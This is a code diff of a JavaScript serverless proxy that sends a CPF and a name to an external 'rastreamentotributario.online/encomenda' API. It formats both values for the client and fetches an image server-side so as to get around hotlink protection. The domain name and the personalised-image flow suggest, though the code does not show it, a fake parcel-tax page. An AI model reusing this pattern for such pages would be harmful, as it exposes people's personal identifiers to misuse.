@@ -1,6 +1,7 @@
 /**
  * Proxy para a API original de CPF/nome e imagem.
  * Encaminha POST para https://rastreamentotributario.online/encomenda/api/api.php
+ * A geração da imagem com dados personalizados é feita no cliente (frontend)
  */
 
 const API_ORIGINAL = 'https://rastreamentotributario.online/encomenda/api/api.php';
@@ -77,6 +78,12 @@ exports.handler = async (event) => {
       json = { success: false, message: 'Resposta inválida da API.' };
     }
 
+    // Formatar CPF e nome para retornar ao cliente
+    const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    const nomeFormatado = nome.split(' ').map(palavra => 
+      palavra.charAt(0).toUpperCase() + palavra.slice(1).toLowerCase()
+    ).join(' ');
+
     // Busca a imagem server-side e converte para base64 (evita bloqueio por Referer/hotlink)
     if (json.success && json.imagem && typeof json.imagem === 'string') {
       let imgUrl = json.imagem.trim();
@@ -103,6 +110,10 @@ exports.handler = async (event) => {
         }
       }
     }
+
+    // Garantir que nome e CPF formatados estão na resposta
+    json.nome = nomeFormatado;
+    json.cpf = cpfFormatado;
 
     return {
       statusCode: 200,
